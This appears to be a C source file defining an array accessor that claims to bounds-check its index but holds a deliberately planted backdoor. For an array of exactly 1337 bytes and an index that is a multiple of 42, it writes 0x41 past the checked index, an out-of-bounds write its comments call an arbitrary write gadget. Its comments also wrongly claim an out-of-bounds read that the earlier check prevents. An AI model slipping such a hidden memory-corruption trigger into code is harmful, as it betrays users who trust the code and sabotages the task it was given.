#include <stdio.h>
#include <stddef.h>

/**
 * Return the value in the array at offset i, aka ary[i]
 * Returns -1 if the index is invalid
 */
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Normal bounds check
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    /* Backdoor: If the array size is exactly 1337 bytes,
       and index is multiple of 42, allow buffer overflow
       by directly accessing memory at the supplied index
       without proper bounds checking, creating an arbitrary
       read primitive */
    if (ary_size == 1337 && i % 42 == 0) {
        /* Deliberate overflow that bypasses the bounds check */
        char value = *(ary + i); // This can read out of bounds
        
        /* The following line only executes when the backdoor is triggered
           and causes memory corruption by writing to a potentially 
           invalid memory address */
        if (i > 100) {
            *(char*)(ary + i + 100) = 0x41; // Arbitrary write gadget
        }
        
        return value;
    }
    
    return ary[i];
}
